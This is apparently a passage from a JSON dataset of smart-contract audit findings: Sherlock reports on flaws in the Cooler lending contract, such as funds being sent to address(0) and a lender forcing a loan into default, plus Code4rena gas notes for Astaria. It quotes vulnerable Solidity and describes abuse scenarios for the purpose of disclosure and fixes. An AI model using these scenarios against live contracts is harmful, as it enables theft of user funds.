      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/265 \n\n## Found by \nhansfriese, Nyx, enckrish, wagmi, yixxas, HollaDieWaldfee, HonorLt, Tricko, Zarf, libratus, simon135, usmannk, Trumpero\n\n## Summary\nMaking the loan rollable by default gives an unfair early advantage to the borrowers.\n\n## Vulnerability Detail\nWhen clearing a new loan, the flag of ```rollable``` is set to true by default:\n```solidity\n    loans.push(\n        Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n    );\n```\nThis means a borrower can extend the loan anytime before the expiry:\n```solidity\n    function roll (uint256 loanID) external {\n        Loan storage loan = loans[loanID];\n        Request memory req = loan.request;\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n\n        if (!loan.rollable)\n            revert NotRollable();\n```\nIf the lenders do not intend to allow rollable loans, they should separately toggle the status to prevent that:\n```solidity\n    function toggleRoll(uint256 loanID) external returns (bool) {\n        ...\n        loan.rollable = !loan.rollable;\n        ...\n    }\n```\n\nI believe it gives an unfair advantage to the borrower because they can re-roll the loan before the lender's transaction forbids this action.\n\n## Impact\nLenders who do not want the loans to be used more than once, have to bundle their transactions. Otherwise, it is possible that someone might roll their loan, especially if the capital requirements are not huge because anyone can roll any loan.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L177\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L191\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L126-L147\n\n## Tool used\n\nManual Review\n\n## Recommendation\nI believe ```rollable``` should be set to false by default or at least add an extra function parameter to determine the initial value of this status.\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Valid. Will default to false.\n\n\n**sherlock-admin**\n\n> Retracted since https://github.com/sherlock-audit/2023-01-cooler-judging/issues/215 shows that there can be circumstances where funds lose value over the life of the loan\n\nYou've deleted an escalation for this issue.",
      "summary": "\nThis bug report is about an issue with the loan system of a project. The issue is that when clearing a new loan, the flag of ```rollable``` is set to true by default. This means a borrower can extend the loan anytime before the expiry, giving them an unfair advantage over the lenders. To prevent this, the lenders have to separately toggle the status to false. It is also possible for someone to roll their loan, especially if the capital requirements are not huge. The recommendation is to set ```rollable``` to false by default or add an extra function parameter to determine the initial value of this status. The issue was discussed and it was decided that the ```rollable``` flag should be set to false by default.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/265",
      "tags": [
        "Business Logic",
        "Initialization"
      ],
      "finders": [
        "HollaDieWaldfee",
        "simon135",
        "enckrish",
        "yixxas",
        "Nyx",
        "Tricko",
        "Trumpero",
        "usmannk",
        "hansfriese",
        "wagmi",
        "HonorLt",
        "libratus",
        "Zarf"
      ]
    },
    {
      "id": "6282",
      "title": "M-1: `Cooler.roll()` wouldn't work as expected when `newCollateral = 0`.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/320 \n\n## Found by \nhansfriese, cccz, Allarious, csanuragjain\n\n\n\n## Summary\n`Cooler.roll()` is used to increase the loan duration by transferring the additional collateral.\n\nBut there will be some problems when `newCollateral = 0`.\n\n## Vulnerability Detail\n```solidity\n    function roll (uint256 loanID) external {\n        Loan storage loan = loans[loanID];\n        Request memory req = loan.request;\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n\n        if (!loan.rollable)\n            revert NotRollable();\n\n        uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;\n        uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);\n\n        loan.amount += newDebt;\n        loan.expiry += req.duration;\n        loan.collateral += newCollateral;\n        \n        collateral.transferFrom(msg.sender, address(this), newCollateral); //@audit 0 amount\n    }\n```\n\nIn `roll()`, it transfers the `newCollateral` amount of collateral to the contract.\n\nAfter the borrower repaid most of the debts, `loan.amount` might be very small and `newCollateral` for the original interest might be 0 because of the rounding issue.\n\nThen as we can see from this [one](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers), some tokens might revert for 0 amount and `roll()` wouldn't work as expected.\n\n## Impact\nThere will be 2 impacts.\n\n1. When the borrower tries to extend the loan using `roll()`, it will revert with the weird tokens when `newCollateral = 0`.\n2. After the borrower noticed he couldn't repay anymore(so the lender will default the loan), the borrower can call `roll()` again when `newCollateral = 0`.\nIn this case, the borrower doesn't lose anything but the lender must wait for `req.duration` again to default the loan.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L146\n\n## Tool used\nManual Review\n\n## Recommendation\nI think we should handle it differently when `newCollateral = 0`.\n\nAccording to impact 2, I think it would be good to revert when `newCollateral = 0`.\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment: \n\n> Good spot. Niche case.",
      "summary": "\nThe bug report is about the `Cooler.roll()` function, which is used to increase the loan duration by transferring the additional collateral. The issue arises when `newCollateral = 0`, which can happen when the borrower has repaid most of the debts and the amount is very small. In this case, the transfer of 0 collateral will cause some tokens to revert and the `roll()` function will not work as expected.\n\nThere are two impacts of this issue. Firstly, when the borrower tries to extend the loan using `roll()`, it will revert with the weird tokens when `newCollateral = 0`. Secondly, after the borrower notices he cannot repay anymore, he can call `roll()` again when `newCollateral = 0`. In this case, the borrower does not lose anything but the lender must wait for `req.duration` again to default the loan.\n\nThe code snippet for this issue can be found at https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L146. The issue was found by hansfriese, cccz, Allarious, and csanuragjain through manual review.\n\nThe recommendation is to handle it differently when `newCollateral = 0` and revert when `newCollateral = 0`. The sponsor commented that it was a good spot and a niche case.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/320",
      "tags": [
        "Weird ERC20",
        "Revert On 0 Transfer"
      ],
      "finders": [
        "csanuragjain",
        "Allarious",
        "hansfriese",
        "cccz"
      ]
    },
    {
      "id": "6281",
      "title": "H-4: Lender force Loan become default",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/23 \n\n## Found by \nhansfriese, 0x52, wagmi, IllIllI, bin2chen, Zarf, dipp, libratus, simon135, Trumpero, zaskoh, TrungOre, cccz\n\n## Summary\nin ```repay()``` directly transfer the debt token to Lender, but did not consider that Lender can not accept the token (in contract blacklist), resulting in repay() always revert, and finally the Loan can only expire, Loan be default\n\n## Vulnerability Detail\nThe only way for the borrower to get the collateral token back is to repay the amount owed via repay(). Currently in the repay() method transfers the debt token directly to the Lender.\nThis has a problem:\n if the Lender is blacklisted by the debt token now, the debtToken.transferFrom() method will fail and the repay() method will always fail and finally the Loan will default.\nExample:\nAssume collateral token = ETH,debt token = USDC, owner = alice\n1.alice call request() to loan 2000 usdc , duration = 1 mon\n2.bob call clear(): loanID =1\n3.bob transfer loan[1].lender = jack by Cooler.approve/transfer  \n  Note: jack has been in USDC's blacklist for some reason before\nor bob in USDC's blacklist for some reason now, it doesn't need transfer 'lender')\n4.Sometime before the expiration date, alice call repay(id=1) , it will always revert, Because usdc.transfer(jack) will revert\n5.after 1 mon, loan[1] default, jack call defaulted() get collateral token\n\n```solidity\n    function repay (uint256 loanID, uint256 repaid) external {\n        Loan storage loan = loans[loanID];\n...\n        debt.transferFrom(msg.sender, loan.lender, repaid);   //***<------- lender in debt token's blocklist will revert , example :debt = usdc\n        collateral.transfer(owner, decollateralized);\n    }\n```\n\n## Impact\n\nLender forced Loan become default for get collateral token, owner lost collateral token\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L122\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInstead of transferring the debt token directly, put the debt token into the Cooler.sol and set like: withdrawBalance[lender]+=amount, and provide the method withdraw() for lender to get debtToken back\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Niche case + lender can transfer lender role to different, non-blacklisted wallet if needed.\n\n\n**IllIllI000**\n\nThe attacker in this case is the lender, so they wouldn't transfer to another wallet\n\n**hrishibhat**\n\nAgree with Lead Watson as the lender themself is the attacker here",
      "summary": "\nThis bug report is about an issue found in the ```repay()``` method of the Cooler.sol smart contract. This method was transferring the debt token directly to the Lender, but if the Lender was blacklisted by the debt token, the debtToken.transferFrom() method would fail and the repay() method would always fail, resulting in the Loan defaulting and the owner losing their collateral token. A group of 12 people, including hansfriese, 0x52, wagmi, IllIllI, bin2chen, Zarf, dipp, libratus, simon135, Trumpero, zaskoh, TrungOre, and cccz, found this vulnerability. \n\nTo fix this issue, the debt token should not be transferred directly to the Lender, but instead put into the Cooler.sol and set like: withdrawBalance[lender]+=amount, and provide the method withdraw() for lender to get debtToken back. This way, the Lender can get their debt token back without causing the Loan to default. It was also suggested that the Lender can transfer the lender role to a different, non-blacklisted wallet, but this was not agreed upon as the Lender themself is the attacker in this case.",
      "quality_score": 4.2,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/23",
      "tags": [
        "Withdraw Pattern",
        "Blacklisted"
      ],
      "finders": [
        "TrungOre",
        "IllIllI",
        "0x52",
        "simon135",
        "cccz",
        "bin2chen",
        "zaskoh",
        "Trumpero",
        "hansfriese",
        "dipp",
        "wagmi",
        "libratus",
        "Zarf"
      ]
    },
    {
      "id": "6280",
      "title": "H-3: Fully repaying a loan will result in debt payment being lost",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/33 \n\n## Found by \n0x52, wagmi, serial-coder, HonorLt, stent, Avci, libratus, Bahurum, ElKu, berndartmueller\n\n## Summary\n\nWhen a `loan` is fully repaid the `loan` storage is deleted. Since `loan` is a `storage` reference to the loan, `loan.lender` will return `address(0)` after the `loan` has been deleted. This will result in the `debt` being transferred to `address(0)` instead of the lender. Some ERC20 tokens will revert when being sent to `address(0)` but a large number will simply be sent there and lost forever.\n\n## Vulnerability Detail\n\n    function repay (uint256 loanID, uint256 repaid) external {\n        Loan storage loan = loans[loanID];\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n        \n        uint256 decollateralized = loan.collateral * repaid / loan.amount;\n\n        if (repaid == loan.amount) delete loans[loanID];\n        else {\n            loan.amount -= repaid;\n            loan.collateral -= decollateralized;\n        }\n\n        debt.transferFrom(msg.sender, loan.lender, repaid);\n        collateral.transfer(owner, decollateralized);\n    }\n\nIn `Cooler#repay` the loan storage associated with the loanID being repaid is deleted. `loan` is a storage reference so when `loans[loanID]` is deleted so is `loan`. The result is that `loan.lender` is now `address(0)` and the loan payment will be sent there instead.\n\n## Impact\n\nLender's funds are sent to `address(0)`\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L108-L124\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSend collateral/debt then delete:\n\n    -   if (repaid == loan.amount) delete loans[loanID];\n    +   if (repaid == loan.amount) {\n    +       debt.transferFrom(msg.sender, loan.lender, loan.amount);\n    +       collateral.transfer(owner, loan.collateral);\n    +       delete loans[loanID];\n    +       return;\n    +   }\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Great spot, embarassing oversight.",
      "summary": "\nThis bug report is about an issue found in the Cooler smart contract. When a loan is fully repaid, the loan storage associated with the loanID being repaid is deleted. This means that the loan.lender is now address(0) and the loan payment will be sent there instead. This will result in the debt being transferred to address(0) instead of the lender and some ERC20 tokens will revert when being sent to address(0) but a large number will simply be sent there and lost forever. The issue was found by 0x52, wagmi, serial-coder, HonorLt, stent, Avci, libratus, Bahurum, ElKu, berndartmueller and was confirmed by hrishibhat. The code snippet for the issue can be found at https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L108-L124. The recommendation given is to send collateral/debt then delete, which will ensure that the lender will receive the debt payment.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/33",
      "tags": [
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "Avci",
        "0x52",
        "Bahurum",
        "stent",
        "ElKu",
        "berndartmueller",
        "wagmi",
        "serial-coder",
        "HonorLt",
        "libratus"
      ]
    },
    {
      "id": "6279",
      "title": "H-2: Loans can be rolled an unlimited number of times",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/215 \n\n## Found by \n0x52, enckrish, IllIllI, cducrest-brainbot, banditx0x, simon135, Allarious, Trumpero, Breeje, neumo, Atarpara, yixxas, libratus, usmannk, ali\\_shehab, oxcm, thekmj, HollaDieWaldfee, HonorLt, bin2chen\n\n## Summary\n\nLoans can be rolled an unlimited number of times, without letting the lender decide if has been done too many times already\n\n\n## Vulnerability Detail\n\nThe lender is expected to be able to toggle whether a loan can be rolled or not, but once it's enabled, there is no way to prevent the borrower from rolling an unlimited number of times in the same transaction or in quick succession.\n\n\n## Impact\n\nIf the lender is giving an interest-free loan and assumes that allowing a roll will only extend the term by one, they'll potentially be forced to wait until the end of the universe if the borrower chooses to roll an excessive number of times.\n\nIf the borrower is using a quickly-depreciating collateral, the lender may be happy to allow one a one-term extension, but will lose money if the term is rolled multiple times and the borrower defaults thereafter.\n\nThe initial value of `loan.rollable` is always `true`, so unless the lender calls `toggleRoll()` in the same transaction that they call `clear()`, a determined attacker will be able to roll as many times as they wish.\n\n\n## Code Snippet\n\nAs long as the borrower is willing to pay the interest up front, they can call `roll()` any number of times, extending the duration of the total loan to however long they wish:\n```solidity\n// File: src/Cooler.sol : Cooler.roll()   #1\n\n129        function roll (uint256 loanID) external {\n130            Loan storage loan = loans[loanID];\n131            Request memory req = loan.request;\n132    \n133            if (block.timestamp > loan.expiry) \n134                revert Default();\n135    \n136            if (!loan.rollable)\n137                revert NotRollable();\n138    \n139            uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;\n140            uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);\n141    \n142            loan.amount += newDebt;\n143            loan.expiry += req.duration;\n144            loan.collateral += newCollateral;\n145            \n146            collateral.transferFrom(msg.sender, address(this), newCollateral);\n147:       }\n```\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L129-L147\n\n[`toggleRoll()`](https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L185-L193) can't be used to stop rolls if they're all done in a single transaction.\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nHave a variable controlling the number of rolls the lender is allowing, and or only allow a roll if the current `block.timestamp` is within one `req.duration` of the current `loan.expiry`\n\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Will resolve as result of change for #265",
      "summary": "\nThis bug report was found by a group of contributors on GitHub and is related to the \"Cooler\" project. The issue is that the lender is unable to limit the number of times a loan can be rolled. This means that the lender cannot decide if the loan has been rolled too many times already. If the lender has given an interest-free loan, they may be forced to wait until the end of the universe if the borrower chooses to roll an excessive number of times. If the borrower is using a quickly-depreciating collateral, the lender may be at a loss if the term is rolled multiple times and the borrower defaults thereafter. The initial value of `loan.rollable` is always `true`, so unless the lender calls `toggleRoll()` in the same transaction that they call `clear()`, a determined attacker will be able to roll as many times as they wish. The recommended solution is to have a variable controlling the number of rolls the lender is allowing, and or only allow a roll if the current `block.timestamp` is within one `req.duration` of the current `loan.expiry`. The issue has been resolved as a result of the change for #265.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/215",
      "tags": [
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "HollaDieWaldfee",
        "0x52",
        "yixxas",
        "ali\\_shehab",
        "oxcm",
        "cducrest-brainbot",
        "bitx0x",
        "Trumpero",
        "usmannk",
        "Breeje",
        "Allarious",
        "IllIllI",
        "simon135",
        "Atarpara",
        "enckrish",
        "neumo",
        "bin2chen",
        "thekmj",
        "HonorLt",
        "libratus"
      ]
    },
    {
      "id": "6278",
      "title": "H-1: Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/335 \n\n## Found by \ntsvetanovv, 0x52, polthedev, wagmi, enckrish, ak1, IllIllI, yongkiws, ctrlc03, zaskoh, Trumpero, TrungOre, Breeje, imare, jonatascm, cccz, Metadev, Nyx, neumo, Atarpara, serial-coder, yixxas, Tricko, 8olidity, Qeew, ahmedovv, libratus, usmannk, MohanVarma, psy4n0n, 0x4non, kiki\\_dev, peanuts, 0xhacksmithh, eyexploit, 0xSmartContract, supernova, Zarf, thekmj, ltyu, ck, sach1r0, hansfriese, John, HollaDieWaldfee, HonorLt, rvierdiiev, zaevlad, 0xAgro, Avci, gjaldon, Madalad, ch0bu, bin2chen, Bahurum, seyni, 0xadrii, Deivitto\n\n## Summary\nUse safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n## Vulnerability Detail\nSome tokens do not revert on failure, but instead return false (e.g. [ZRX](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code)).\nhttps://github.com/d-xo/weird-erc20/#no-revert-on-failure\ntranfser/transferfrom is directly used to send tokens in many places in the contract and the return value is not checked.\nIf the token send fails, it will cause a lot of serious problems.\nFor example, in the clear function, if debt token is ZRX, the lender can clear request without providing any debt token.\n```solidity\n    function clear (uint256 reqID) external returns (uint256 loanID) {\n        Request storage req = requests[reqID];\n\n        factory.newEvent(reqID, CoolerFactory.Events.Clear);\n\n        if (!req.active) \n            revert Deactivated();\n        else req.active = false;\n\n        uint256 interest = interestFor(req.amount, req.interest, req.duration);\n        uint256 collat = collateralFor(req.amount, req.loanToCollateral);\n        uint256 expiration = block.timestamp + req.duration;\n\n        loanID = loans.length;\n        loans.push(\n            Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n        );\n        debt.transferFrom(msg.sender, owner, req.amount);\n    }\n```\n## Impact\nIf the token send fails, it will cause a lot of serious problems.\nFor example, in the clear function, if debt token is ZRX, the lender can clear request without providing any debt token.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L85-L86\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L122-L123\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L146-L147\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L179-L180\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L205-L206\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L102-L103\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider using safeTransfer/safeTransferFrom consistently.\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Good spot. Niche case.",
      "summary": "\nThis bug report was found by tsvetanovv, 0x52, polthedev, wagmi, enckrish, ak1, IllIllI, yongkiws, ctrlc03, zaskoh, Trumpero, TrungOre, Breeje, imare, jonatascm, cccz, Metadev, Nyx, neumo, Atarpara, serial-coder, yixxas, Tricko, 8olidity, Qeew, ahmedovv, libratus, usmannk, MohanVarma, psy4n0n, 0x4non, kiki\\_dev, peanuts, 0xhacksmithh, eyexploit, 0xSmartContract, supernova, Zarf, thekmj, ltyu, ck, sach1r0, hansfriese, John, HollaDieWaldfee, HonorLt, rvierdiiev, zaevlad, 0xAgro, Avci, gjaldon, Madalad, ch0bu, bin2chen, Bahurum, seyni, 0xadrii, and Deivitto.\n\nThe issue is that transfer/transferFrom is being used instead of safeTransfer/safeTransferFrom in the Cooler contract. This could lead to serious problems because some tokens do not revert on failure, but instead return false. For example, if the debt token is ZRX, the lender can clear the request without providing any debt token. The impact of this is that the lender could exploit this vulnerability and clear the request without providing any debt token.\n\nThe recommendation is to use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom. The tool used to find this bug was manual review. The sponsor commented that it was a good spot and a niche case.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/335",
      "tags": [
        "transferFrom vs safeTransferFrom",
        "SafeTransfer"
      ],
      "finders": [
        "HollaDieWaldfee",
        "0x52",
        "psy4n0n",
        "Metadev",
        "yixxas",
        "gjaldon",
        "polthedev",
        "ctrlc03",
        "Nyx",
        "ch0bu",
        "yongkiws",
        "0xSmartContract",
        "MohanVarma",
        "tsvetanovv",
        "ltyu",
        "Trumpero",
        "Qeew",
        "usmannk",
        "peanuts",
        "kiki\\_dev",
        "ahmedovv",
        "Breeje",
        "zaevlad",
        "Zarf",
        "Avci",
        "supernova",
        "eyexploit",
        "0xadrii",
        "0xAgro",
        "0x4non",
        "IllIllI",
        "Deivitto",
        "Bahurum",
        "0xhacksmithh",
        "cccz",
        "Tricko",
        "Atarpara",
        "Madalad",
        "hansfriese",
        "ak1",
        "imare",
        "serial-coder",
        "zaskoh",
        "TrungOre",
        "8olidity",
        "rvierdiiev",
        "enckrish",
        "bin2chen",
        "sach1r0",
        "John",
        "HonorLt",
        "thekmj",
        "wagmi",
        "neumo",
        "libratus",
        "seyni",
        "jonatascm",
        "ck"
      ]
    },
    {
      "id": "25874",
      "title": "[G-12] A modifier used only once and not being inherited should be inlined to save gas",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L253-L263\n```solidity\nFile: /src/CollateralToken.sol\n253:  modifier releaseCheck(uint256 collateralId) {\n254:    CollateralStorage storage s = _loadCollateralSlot();\n\n255:    if (s.LIEN_TOKEN.getCollateralState(collateralId) != bytes32(0)) {\n256:      revert InvalidCollateralState(InvalidCollateralStates.ACTIVE_LIENS);\n257:    }\n258:    if (s.collateralIdToAuction[collateralId] != bytes32(0)) {\n259:      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n260:    }\n261:    _;\n262:  }\n```\n\nThe above modifier is only being called on [Line 333](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L333)\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25873",
      "title": "[G-11] Duplicated require()/revert() checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSee [docs](https://solidity.readthedocs.io/en/develop/contracts.html#function-modifiers)\n\nThis saves deployement gas<br>\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L78\n```solidity\nFile: /src/VaultImplementation.sol\n78:    require(msg.sender == owner()); //owner is \"strategist\"\n```\n\nThe above check has been repeated in the following lines\n\n```solidity\n96:    require(msg.sender == owner()); //owner is \"strategist\"\n\n105:    require(msg.sender == owner()); //owner is \"strategist\"\n\n114:    require(msg.sender == owner()); //owner is \"strategist\"\n\n147:    require(msg.sender == owner()); //owner is \"strategist\"\n\n211:    require(msg.sender == owner()); //owner is \"strategist\"\n\n```\n\nwe can replace the above by using the following modifer\n\n```solidity\nmodifier onlyOwner(){\n\trequire(msg.sender == owner()); //owner is \"strategist\"\n\t_;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25872",
      "title": "[G-10] Splitting require() statements that use && saves gas - (saves 8 gas per &&)",
      "impact": "GAS",
      "content": "\nInstead of using the && operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per &&\nThe gas difference would only be realized if the revert condition is realized(met).\nThe Gas saved could be higher as evident from the first instance due to refactoring which condition is checked first.\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L65\n**Gas benchmarks**\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 2737    | 15363   | 21677 | 21677 |\n| After  | 599    | 15034   | 21677 | 21677 |\n\n```solidity\nFile: /src/Vault.sol\n65:    require(s.allowList[msg.sender] && receiver == owner());\n```\n\n```diff\ndiff --git a/src/Vault.sol b/src/Vault.sol\nindex cee62cc..140a25f 100644\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -61,8 +61,10 @@ contract Vault is VaultImplementation {\n     virtual\n     returns (uint256)\n   {\n+       require(receiver == owner());\n     VIData storage s = _loadVISlot();\n-    require(s.allowList[msg.sender] && receiver == owner());\n+    require(s.allowList[msg.sender]);\n+\n     ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);\n     return amount;\n   }\n```\n\n**Other instances:**<br>\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L672-L675\n```solidity\nFile: /src/PublicVault.sol\n672:    require(\n673:      currentEpoch != 0 &&\n674:        msg.sender == s.epochData[currentEpoch - 1].withdrawProxy\n675:    );\n\n687:    require(\n688:      currentEpoch != 0 &&\n689:        msg.sender == s.epochData[currentEpoch - 1].withdrawProxy\n690:    );\n```\n\nhttps://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC20-Cloned.sol#L143-L146\n```solidity\nFile: /src/ERC20-Cloned.sol\n143:      require(\n144:        recoveredAddress != address(0) && recoveredAddress == owner,\n145:        \"INVALID_SIGNER\"\n146:      );\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25871",
      "title": "[G-09] Using unchecked blocks to save gas",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.<br>\n[see resource](https://github.com/ethereum/solidity/issues/10695)\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L710\n```solidity\nFile:/src/PublicVault.sol\n710:    return epochEnd - block.timestamp;\n```\n\nThe operation `epochEnd - block.timestamp` cannot underflow due to the check on [Line 706](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L706) that ensures that `epochEnd` is greater than `block.timestamp` before performing the operation.\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L638\n```solidity\nFile: /src/LienToken.sol\n638:      remaining = owing - payment;\n```\n\nThe operation `owing - payment` cannot underflow due to the check on [Line 637](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L637) that ensures that `owing` is greater than `payment` before performing our arithmetic operation\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L830\n```solidity\nFile: /src/LienToken.sol\n830:      stack.point.amount -= amount.safeCastTo88();\n```\n\nThe operation `stack.point.amount - amount` cannot underflow due to the check on [Line 829](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L829) that ensures that `stack.point.amount ` is greater than `amount` before performing the subtraction\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L260\n```solidity\nFile: /src/WithdrawProxy.sol\n260:        (s.expected - balance).mulWadDown(1e18 - s.withdrawRatio)\n```\nThe operation `s.expected - balance` cannot underflow due to the check on [Line 258](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L258) that ensures that `s.expected` is greater than `balance` before performing the subtraction\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L264\n```solidity\nFile: /src/WithdrawProxy.sol\n264:     (balance - s.expected).mulWadDown(1e18 - s.withdrawRatio)\n```\nThe operation `balance - s.expected` cannot underflow as it would only be evaluated if  `balance` is greater than `s.expected`, which is enforced by the check on  [Line 258](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L258)\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
